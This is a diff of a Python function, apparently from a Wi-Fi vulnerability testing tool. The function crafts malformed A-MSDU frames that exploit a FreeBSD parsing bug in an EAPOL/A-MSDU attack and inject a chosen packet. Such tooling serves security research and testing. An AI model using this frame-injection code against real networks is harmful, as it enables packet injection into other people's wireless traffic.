@@ -39,25 +39,27 @@ def log_level2switch(options):
 	elif options.debug >= 1: return ["-d", "-K"]
 	return ["-K"]
 
-def freebsd_create_eapolmsdu(src, dst, payload):
+def freebsd_create_eapolmsdu(src, dst, toinject):
 	"""
-	FreeBSD doesn't properly parse EAPOL/MSDU frames for some reason.
-	It's unclear why. But this code puts the length and addresses at
-	the right positions so FreeBSD will parse the A-MSDU frame
-	successfully, so that we can even attack bad implementations.
+	FreeBSD doesn't properly parse A-MSDU frames that start with an
+	LLC/SNAP header. This is problematic when performing the EAPOL/AMSDU
+	attack. Details why this happens are unclear. To better understand
+	how the frames are parsed, see docs/freebsd_amsdu_bug.odt
 	"""
 
-	# EAPOL and source address. I don't think the value "\x00\06" is important
+	# Subframe 1: LLC/SNAP for EAPOL. The X's will be part of the first subframe.
 	rawmac = bytes.fromhex(src.replace(':', ''))
-	prefix = raw(LLC()/SNAP()/EAPOL()) + b"\x00\x06" + rawmac
+	prefix = raw(LLC()/SNAP()/EAPOL()) + b"XXXXXXXX"
 
-	# Length followed by the payload
-	payload = create_msdu_subframe(src, dst, payload)
-	payload = prefix + struct.pack(">I", len(payload)) + raw(payload)
+	# Subframe 1: content will be the X's (excluding the first 6 bytes). The actual
+	#	ethernet payload length will be payload_len - 16 due to parsing bugs.
+	payload_len = 17
+	total_len   = payload_len + 6 + 6 + 2
+	padding_len = 4 - (total_len % 4) if total_len % 4 != 0 else 0
+	payload = prefix + struct.pack(">H", payload_len) + payload_len * b"X" + padding_len * b"Y"
 
-	# Put the destination MAC address in the "right" place
-	rawmac = bytes.fromhex(dst.replace(':', ''))
-	payload = payload[:16] + rawmac[:4] + payload[20:]
+	# Subframe 2: we can now append it normally
+	payload += raw(create_msdu_subframe(src, dst, toinject))
 
 	return payload
 
